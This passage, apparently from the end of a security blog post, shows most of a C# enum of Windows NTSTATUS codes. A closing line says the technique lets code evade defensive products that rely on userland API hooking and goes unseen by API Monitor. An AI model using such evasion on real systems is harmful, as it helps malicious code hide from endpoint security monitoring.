            InfoLengthMismatch = <span style="color:#ae81ff">0xc0000004</span>,
            AccessViolation = <span style="color:#ae81ff">0xc0000005</span>,
            InPageError = <span style="color:#ae81ff">0xc0000006</span>,
            PagefileQuota = <span style="color:#ae81ff">0xc0000007</span>,
            InvalidHandle = <span style="color:#ae81ff">0xc0000008</span>,
            BadInitialStack = <span style="color:#ae81ff">0xc0000009</span>,
            BadInitialPc = <span style="color:#ae81ff">0xc000000a</span>,
            InvalidCid = <span style="color:#ae81ff">0xc000000b</span>,
            TimerNotCanceled = <span style="color:#ae81ff">0xc000000c</span>,
            InvalidParameter = <span style="color:#ae81ff">0xc000000d</span>,
            NoSuchDevice = <span style="color:#ae81ff">0xc000000e</span>,
            NoSuchFile = <span style="color:#ae81ff">0xc000000f</span>,
            InvalidDeviceRequest = <span style="color:#ae81ff">0xc0000010</span>,
            EndOfFile = <span style="color:#ae81ff">0xc0000011</span>,
            WrongVolume = <span style="color:#ae81ff">0xc0000012</span>,
            NoMediaInDevice = <span style="color:#ae81ff">0xc0000013</span>,
            NoMemory = <span style="color:#ae81ff">0xc0000017</span>,
            ConflictingAddresses = <span style="color:#ae81ff">0xc0000018</span>,
            NotMappedView = <span style="color:#ae81ff">0xc0000019</span>,
            UnableToFreeVm = <span style="color:#ae81ff">0xc000001a</span>,
            UnableToDeleteSection = <span style="color:#ae81ff">0xc000001b</span>,
            IllegalInstruction = <span style="color:#ae81ff">0xc000001d</span>,
            AlreadyCommitted = <span style="color:#ae81ff">0xc0000021</span>,
            AccessDenied = <span style="color:#ae81ff">0xc0000022</span>,
            BufferTooSmall = <span style="color:#ae81ff">0xc0000023</span>,
            ObjectTypeMismatch = <span style="color:#ae81ff">0xc0000024</span>,
            NonContinuableException = <span style="color:#ae81ff">0xc0000025</span>,
            BadStack = <span style="color:#ae81ff">0xc0000028</span>,
            NotLocked = <span style="color:#ae81ff">0xc000002a</span>,
            NotCommitted = <span style="color:#ae81ff">0xc000002d</span>,
            InvalidParameterMix = <span style="color:#ae81ff">0xc0000030</span>,
            ObjectNameInvalid = <span style="color:#ae81ff">0xc0000033</span>,
            ObjectNameNotFound = <span style="color:#ae81ff">0xc0000034</span>,
            ObjectNameCollision = <span style="color:#ae81ff">0xc0000035</span>,
            ObjectPathInvalid = <span style="color:#ae81ff">0xc0000039</span>,
            ObjectPathNotFound = <span style="color:#ae81ff">0xc000003a</span>,
            ObjectPathSyntaxBad = <span style="color:#ae81ff">0xc000003b</span>,
            DataOverrun = <span style="color:#ae81ff">0xc000003c</span>,
            DataLate = <span style="color:#ae81ff">0xc000003d</span>,
            DataError = <span style="color:#ae81ff">0xc000003e</span>,
            CrcError = <span style="color:#ae81ff">0xc000003f</span>,
            SectionTooBig = <span style="color:#ae81ff">0xc0000040</span>,
            PortConnectionRefused = <span style="color:#ae81ff">0xc0000041</span>,
            InvalidPortHandle = <span style="color:#ae81ff">0xc0000042</span>,
            SharingViolation = <span style="color:#ae81ff">0xc0000043</span>,
            QuotaExceeded = <span style="color:#ae81ff">0xc0000044</span>,
            InvalidPageProtection = <span style="color:#ae81ff">0xc0000045</span>,
            MutantNotOwned = <span style="color:#ae81ff">0xc0000046</span>,
            SemaphoreLimitExceeded = <span style="color:#ae81ff">0xc0000047</span>,
            PortAlreadySet = <span style="color:#ae81ff">0xc0000048</span>,
            SectionNotImage = <span style="color:#ae81ff">0xc0000049</span>,
            SuspendCountExceeded = <span style="color:#ae81ff">0xc000004a</span>,
            ThreadIsTerminating = <span style="color:#ae81ff">0xc000004b</span>,
            BadWorkingSetLimit = <span style="color:#ae81ff">0xc000004c</span>,
            IncompatibleFileMap = <span style="color:#ae81ff">0xc000004d</span>,
            SectionProtection = <span style="color:#ae81ff">0xc000004e</span>,
            EasNotSupported = <span style="color:#ae81ff">0xc000004f</span>,
            EaTooLarge = <span style="color:#ae81ff">0xc0000050</span>,
            NonExistentEaEntry = <span style="color:#ae81ff">0xc0000051</span>,
            NoEasOnFile = <span style="color:#ae81ff">0xc0000052</span>,
            EaCorruptError = <span style="color:#ae81ff">0xc0000053</span>,
            FileLockConflict = <span style="color:#ae81ff">0xc0000054</span>,
            LockNotGranted = <span style="color:#ae81ff">0xc0000055</span>,
            DeletePending = <span style="color:#ae81ff">0xc0000056</span>,
            CtlFileNotSupported = <span style="color:#ae81ff">0xc0000057</span>,
            UnknownRevision = <span style="color:#ae81ff">0xc0000058</span>,
            RevisionMismatch = <span style="color:#ae81ff">0xc0000059</span>,
            InvalidOwner = <span style="color:#ae81ff">0xc000005a</span>,
            InvalidPrimaryGroup = <span style="color:#ae81ff">0xc000005b</span>,
            NoImpersonationToken = <span style="color:#ae81ff">0xc000005c</span>,
            CantDisableMandatory = <span style="color:#ae81ff">0xc000005d</span>,
            NoLogonServers = <span style="color:#ae81ff">0xc000005e</span>,
            NoSuchLogonSession = <span style="color:#ae81ff">0xc000005f</span>,
            NoSuchPrivilege = <span style="color:#ae81ff">0xc0000060</span>,
            PrivilegeNotHeld = <span style="color:#ae81ff">0xc0000061</span>,
            InvalidAccountName = <span style="color:#ae81ff">0xc0000062</span>,
            UserExists = <span style="color:#ae81ff">0xc0000063</span>,
            NoSuchUser = <span style="color:#ae81ff">0xc0000064</span>,
            GroupExists = <span style="color:#ae81ff">0xc0000065</span>,
            NoSuchGroup = <span style="color:#ae81ff">0xc0000066</span>,
            MemberInGroup = <span style="color:#ae81ff">0xc0000067</span>,
            MemberNotInGroup = <span style="color:#ae81ff">0xc0000068</span>,
            LastAdmin = <span style="color:#ae81ff">0xc0000069</span>,
            WrongPassword = <span style="color:#ae81ff">0xc000006a</span>,
            IllFormedPassword = <span style="color:#ae81ff">0xc000006b</span>,
            PasswordRestriction = <span style="color:#ae81ff">0xc000006c</span>,
            LogonFailure = <span style="color:#ae81ff">0xc000006d</span>,
            AccountRestriction = <span style="color:#ae81ff">0xc000006e</span>,
            InvalidLogonHours = <span style="color:#ae81ff">0xc000006f</span>,
            InvalidWorkstation = <span style="color:#ae81ff">0xc0000070</span>,
            PasswordExpired = <span style="color:#ae81ff">0xc0000071</span>,
            AccountDisabled = <span style="color:#ae81ff">0xc0000072</span>,
            NoneMapped = <span style="color:#ae81ff">0xc0000073</span>,
            TooManyLuidsRequested = <span style="color:#ae81ff">0xc0000074</span>,
            LuidsExhausted = <span style="color:#ae81ff">0xc0000075</span>,
            InvalidSubAuthority = <span style="color:#ae81ff">0xc0000076</span>,
            InvalidAcl = <span style="color:#ae81ff">0xc0000077</span>,
            InvalidSid = <span style="color:#ae81ff">0xc0000078</span>,
            InvalidSecurityDescr = <span style="color:#ae81ff">0xc0000079</span>,
            ProcedureNotFound = <span style="color:#ae81ff">0xc000007a</span>,
            InvalidImageFormat = <span style="color:#ae81ff">0xc000007b</span>,
            NoToken = <span style="color:#ae81ff">0xc000007c</span>,
            BadInheritanceAcl = <span style="color:#ae81ff">0xc000007d</span>,
            RangeNotLocked = <span style="color:#ae81ff">0xc000007e</span>,
            DiskFull = <span style="color:#ae81ff">0xc000007f</span>,
            ServerDisabled = <span style="color:#ae81ff">0xc0000080</span>,
            ServerNotDisabled = <span style="color:#ae81ff">0xc0000081</span>,
            TooManyGuidsRequested = <span style="color:#ae81ff">0xc0000082</span>,
            GuidsExhausted = <span style="color:#ae81ff">0xc0000083</span>,
            InvalidIdAuthority = <span style="color:#ae81ff">0xc0000084</span>,
            AgentsExhausted = <span style="color:#ae81ff">0xc0000085</span>,
            InvalidVolumeLabel = <span style="color:#ae81ff">0xc0000086</span>,
            SectionNotExtended = <span style="color:#ae81ff">0xc0000087</span>,
            NotMappedData = <span style="color:#ae81ff">0xc0000088</span>,
            ResourceDataNotFound = <span style="color:#ae81ff">0xc0000089</span>,
            ResourceTypeNotFound = <span style="color:#ae81ff">0xc000008a</span>,
            ResourceNameNotFound = <span style="color:#ae81ff">0xc000008b</span>,
            ArrayBoundsExceeded = <span style="color:#ae81ff">0xc000008c</span>,
            FloatDenormalOperand = <span style="color:#ae81ff">0xc000008d</span>,
            FloatDivideByZero = <span style="color:#ae81ff">0xc000008e</span>,
            FloatInexactResult = <span style="color:#ae81ff">0xc000008f</span>,
            FloatInvalidOperation = <span style="color:#ae81ff">0xc0000090</span>,
            FloatOverflow = <span style="color:#ae81ff">0xc0000091</span>,
            FloatStackCheck = <span style="color:#ae81ff">0xc0000092</span>,
            FloatUnderflow = <span style="color:#ae81ff">0xc0000093</span>,
            IntegerDivideByZero = <span style="color:#ae81ff">0xc0000094</span>,
            IntegerOverflow = <span style="color:#ae81ff">0xc0000095</span>,
            PrivilegedInstruction = <span style="color:#ae81ff">0xc0000096</span>,
            TooManyPagingFiles = <span style="color:#ae81ff">0xc0000097</span>,
            FileInvalid = <span style="color:#ae81ff">0xc0000098</span>,
            InsufficientResources = <span style="color:#ae81ff">0xc000009a</span>,
            InstanceNotAvailable = <span style="color:#ae81ff">0xc00000ab</span>,
            PipeNotAvailable = <span style="color:#ae81ff">0xc00000ac</span>,
            InvalidPipeState = <span style="color:#ae81ff">0xc00000ad</span>,
            PipeBusy = <span style="color:#ae81ff">0xc00000ae</span>,
            IllegalFunction = <span style="color:#ae81ff">0xc00000af</span>,
            PipeDisconnected = <span style="color:#ae81ff">0xc00000b0</span>,
            PipeClosing = <span style="color:#ae81ff">0xc00000b1</span>,
            PipeConnected = <span style="color:#ae81ff">0xc00000b2</span>,
            PipeListening = <span style="color:#ae81ff">0xc00000b3</span>,
            InvalidReadMode = <span style="color:#ae81ff">0xc00000b4</span>,
            IoTimeout = <span style="color:#ae81ff">0xc00000b5</span>,
            FileForcedClosed = <span style="color:#ae81ff">0xc00000b6</span>,
            ProfilingNotStarted = <span style="color:#ae81ff">0xc00000b7</span>,
            ProfilingNotStopped = <span style="color:#ae81ff">0xc00000b8</span>,
            NotSameDevice = <span style="color:#ae81ff">0xc00000d4</span>,
            FileRenamed = <span style="color:#ae81ff">0xc00000d5</span>,
            CantWait = <span style="color:#ae81ff">0xc00000d8</span>,
            PipeEmpty = <span style="color:#ae81ff">0xc00000d9</span>,
            CantTerminateSelf = <span style="color:#ae81ff">0xc00000db</span>,
            InternalError = <span style="color:#ae81ff">0xc00000e5</span>,
            InvalidParameter1 = <span style="color:#ae81ff">0xc00000ef</span>,
            InvalidParameter2 = <span style="color:#ae81ff">0xc00000f0</span>,
            InvalidParameter3 = <span style="color:#ae81ff">0xc00000f1</span>,
            InvalidParameter4 = <span style="color:#ae81ff">0xc00000f2</span>,
            InvalidParameter5 = <span style="color:#ae81ff">0xc00000f3</span>,
            InvalidParameter6 = <span style="color:#ae81ff">0xc00000f4</span>,
            InvalidParameter7 = <span style="color:#ae81ff">0xc00000f5</span>,
            InvalidParameter8 = <span style="color:#ae81ff">0xc00000f6</span>,
            InvalidParameter9 = <span style="color:#ae81ff">0xc00000f7</span>,
            InvalidParameter10 = <span style="color:#ae81ff">0xc00000f8</span>,
            InvalidParameter11 = <span style="color:#ae81ff">0xc00000f9</span>,
            InvalidParameter12 = <span style="color:#ae81ff">0xc00000fa</span>,
            ProcessIsTerminating = <span style="color:#ae81ff">0xc000010a</span>,
            MappedFileSizeZero = <span style="color:#ae81ff">0xc000011e</span>,
            TooManyOpenedFiles = <span style="color:#ae81ff">0xc000011f</span>,
            Cancelled = <span style="color:#ae81ff">0xc0000120</span>,
            CannotDelete = <span style="color:#ae81ff">0xc0000121</span>,
            InvalidComputerName = <span style="color:#ae81ff">0xc0000122</span>,
            FileDeleted = <span style="color:#ae81ff">0xc0000123</span>,
            SpecialAccount = <span style="color:#ae81ff">0xc0000124</span>,
            SpecialGroup = <span style="color:#ae81ff">0xc0000125</span>,
            SpecialUser = <span style="color:#ae81ff">0xc0000126</span>,
            MembersPrimaryGroup = <span style="color:#ae81ff">0xc0000127</span>,
            FileClosed = <span style="color:#ae81ff">0xc0000128</span>,
            TooManyThreads = <span style="color:#ae81ff">0xc0000129</span>,
            ThreadNotInProcess = <span style="color:#ae81ff">0xc000012a</span>,
            TokenAlreadyInUse = <span style="color:#ae81ff">0xc000012b</span>,
            PagefileQuotaExceeded = <span style="color:#ae81ff">0xc000012c</span>,
            CommitmentLimit = <span style="color:#ae81ff">0xc000012d</span>,
            InvalidImageLeFormat = <span style="color:#ae81ff">0xc000012e</span>,
            InvalidImageNotMz = <span style="color:#ae81ff">0xc000012f</span>,
            InvalidImageProtect = <span style="color:#ae81ff">0xc0000130</span>,
            InvalidImageWin16 = <span style="color:#ae81ff">0xc0000131</span>,
            LogonServer = <span style="color:#ae81ff">0xc0000132</span>,
            DifferenceAtDc = <span style="color:#ae81ff">0xc0000133</span>,
            SynchronizationRequired = <span style="color:#ae81ff">0xc0000134</span>,
            DllNotFound = <span style="color:#ae81ff">0xc0000135</span>,
            IoPrivilegeFailed = <span style="color:#ae81ff">0xc0000137</span>,
            OrdinalNotFound = <span style="color:#ae81ff">0xc0000138</span>,
            EntryPointNotFound = <span style="color:#ae81ff">0xc0000139</span>,
            ControlCExit = <span style="color:#ae81ff">0xc000013a</span>,
            InvalidAddress = <span style="color:#ae81ff">0xc0000141</span>,
            PortNotSet = <span style="color:#ae81ff">0xc0000353</span>,
            DebuggerInactive = <span style="color:#ae81ff">0xc0000354</span>,
            CallbackBypass = <span style="color:#ae81ff">0xc0000503</span>,
            PortClosed = <span style="color:#ae81ff">0xc0000700</span>,
            MessageLost = <span style="color:#ae81ff">0xc0000701</span>,
            InvalidMessage = <span style="color:#ae81ff">0xc0000702</span>,
            RequestCanceled = <span style="color:#ae81ff">0xc0000703</span>,
            RecursiveDispatch = <span style="color:#ae81ff">0xc0000704</span>,
            LpcReceiveBufferExpected = <span style="color:#ae81ff">0xc0000705</span>,
            LpcInvalidConnectionUsage = <span style="color:#ae81ff">0xc0000706</span>,
            LpcRequestsNotAllowed = <span style="color:#ae81ff">0xc0000707</span>,
            ResourceInUse = <span style="color:#ae81ff">0xc0000708</span>,
            ProcessIsProtected = <span style="color:#ae81ff">0xc0000712</span>,
            VolumeDirty = <span style="color:#ae81ff">0xc0000806</span>,
            FileCheckedOut = <span style="color:#ae81ff">0xc0000901</span>,
            CheckOutRequired = <span style="color:#ae81ff">0xc0000902</span>,
            BadFileType = <span style="color:#ae81ff">0xc0000903</span>,
            FileTooLarge = <span style="color:#ae81ff">0xc0000904</span>,
            FormsAuthRequired = <span style="color:#ae81ff">0xc0000905</span>,
            VirusInfected = <span style="color:#ae81ff">0xc0000906</span>,
            VirusDeleted = <span style="color:#ae81ff">0xc0000907</span>,
            TransactionalConflict = <span style="color:#ae81ff">0xc0190001</span>,
            InvalidTransaction = <span style="color:#ae81ff">0xc0190002</span>,
            TransactionNotActive = <span style="color:#ae81ff">0xc0190003</span>,
            TmInitializationFailed = <span style="color:#ae81ff">0xc0190004</span>,
            RmNotActive = <span style="color:#ae81ff">0xc0190005</span>,
            RmMetadataCorrupt = <span style="color:#ae81ff">0xc0190006</span>,
            TransactionNotJoined = <span style="color:#ae81ff">0xc0190007</span>,
            DirectoryNotRm = <span style="color:#ae81ff">0xc0190008</span>,
            CouldNotResizeLog = <span style="color:#ae81ff">0xc0190009</span>,
            TransactionsUnsupportedRemote = <span style="color:#ae81ff">0xc019000a</span>,
            LogResizeInvalidSize = <span style="color:#ae81ff">0xc019000b</span>,
            RemoteFileVersionMismatch = <span style="color:#ae81ff">0xc019000c</span>,
            CrmProtocolAlreadyExists = <span style="color:#ae81ff">0xc019000f</span>,
            TransactionPropagationFailed = <span style="color:#ae81ff">0xc0190010</span>,
            CrmProtocolNotFound = <span style="color:#ae81ff">0xc0190011</span>,
            TransactionSuperiorExists = <span style="color:#ae81ff">0xc0190012</span>,
            TransactionRequestNotValid = <span style="color:#ae81ff">0xc0190013</span>,
            TransactionNotRequested = <span style="color:#ae81ff">0xc0190014</span>,
            TransactionAlreadyAborted = <span style="color:#ae81ff">0xc0190015</span>,
            TransactionAlreadyCommitted = <span style="color:#ae81ff">0xc0190016</span>,
            TransactionInvalidMarshallBuffer = <span style="color:#ae81ff">0xc0190017</span>,
            CurrentTransactionNotValid = <span style="color:#ae81ff">0xc0190018</span>,
            LogGrowthFailed = <span style="color:#ae81ff">0xc0190019</span>,
            ObjectNoLongerExists = <span style="color:#ae81ff">0xc0190021</span>,
            StreamMiniversionNotFound = <span style="color:#ae81ff">0xc0190022</span>,
            StreamMiniversionNotValid = <span style="color:#ae81ff">0xc0190023</span>,
            MiniversionInaccessibleFromSpecifiedTransaction = <span style="color:#ae81ff">0xc0190024</span>,
            CantOpenMiniversionWithModifyIntent = <span style="color:#ae81ff">0xc0190025</span>,
            CantCreateMoreStreamMiniversions = <span style="color:#ae81ff">0xc0190026</span>,
            HandleNoLongerValid = <span style="color:#ae81ff">0xc0190028</span>,
            NoTxfMetadata = <span style="color:#ae81ff">0xc0190029</span>,
            LogCorruptionDetected = <span style="color:#ae81ff">0xc0190030</span>,
            CantRecoverWithHandleOpen = <span style="color:#ae81ff">0xc0190031</span>,
            RmDisconnected = <span style="color:#ae81ff">0xc0190032</span>,
            EnlistmentNotSuperior = <span style="color:#ae81ff">0xc0190033</span>,
            RecoveryNotNeeded = <span style="color:#ae81ff">0xc0190034</span>,
            RmAlreadyStarted = <span style="color:#ae81ff">0xc0190035</span>,
            FileIdentityNotPersistent = <span style="color:#ae81ff">0xc0190036</span>,
            CantBreakTransactionalDependency = <span style="color:#ae81ff">0xc0190037</span>,
            CantCrossRmBoundary = <span style="color:#ae81ff">0xc0190038</span>,
            TxfDirNotEmpty = <span style="color:#ae81ff">0xc0190039</span>,
            IndoubtTransactionsExist = <span style="color:#ae81ff">0xc019003a</span>,
            TmVolatile = <span style="color:#ae81ff">0xc019003b</span>,
            RollbackTimerExpired = <span style="color:#ae81ff">0xc019003c</span>,
            TxfAttributeCorrupt = <span style="color:#ae81ff">0xc019003d</span>,
            EfsNotAllowedInTransaction = <span style="color:#ae81ff">0xc019003e</span>,
            TransactionalOpenNotAllowed = <span style="color:#ae81ff">0xc019003f</span>,
            TransactedMappingUnsupportedRemote = <span style="color:#ae81ff">0xc0190040</span>,
            TxfMetadataAlreadyPresent = <span style="color:#ae81ff">0xc0190041</span>,
            TransactionScopeCallbacksNotSet = <span style="color:#ae81ff">0xc0190042</span>,
            TransactionRequiredPromotion = <span style="color:#ae81ff">0xc0190043</span>,
            CannotExecuteFileInTransaction = <span style="color:#ae81ff">0xc0190044</span>,
            TransactionsNotFrozen = <span style="color:#ae81ff">0xc0190045</span>,

            MaximumNtStatus = <span style="color:#ae81ff">0xffffffff</span>
        }
    }
}
</code></pre></div><p>This is definately not as straight forward as using P/Invoke, but it&rsquo;s a very effective means of evading defensive products that employ userland hooking.  API Monitor does not detect the use of these APIs - but feel free to verify that for yourself!</p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
